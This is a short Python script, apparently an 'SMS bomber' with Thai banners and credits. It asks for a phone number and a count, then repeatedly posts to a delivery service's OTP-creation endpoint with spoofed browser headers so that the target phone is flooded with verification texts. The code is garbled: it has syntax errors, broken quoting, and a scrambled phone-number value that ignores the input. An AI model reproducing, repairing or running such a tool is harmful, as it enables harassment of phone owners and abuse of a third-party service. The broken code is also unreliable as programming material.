import requests time
print(""
[SMS BY DOOFGODX2]
Dx2 By
ผีกาก้า
"")

no = input('siang : 08xx\n[was:')
jml = int(input([+] uu: )

heder = {'Host': 'api2.1112.com',
'content-length': '44',
'user-agent: 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebkit/537.36 (KHTML, like Gecko)
'accept-language'
: 'th-TH,th;q=0.9,en;q=0.8',
}

data = {"phonenumber":"avaanuazlauastazės","language":"th"}

print("\n[กำลังส่ง]")
for i in range(jml):
sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
if 'eror' in sec. text:
print(f'{i+1}. Luas {no}')
else:
print(f{i+1). Luas {no}')
time.sleep(2.0)

#เครดิตSCK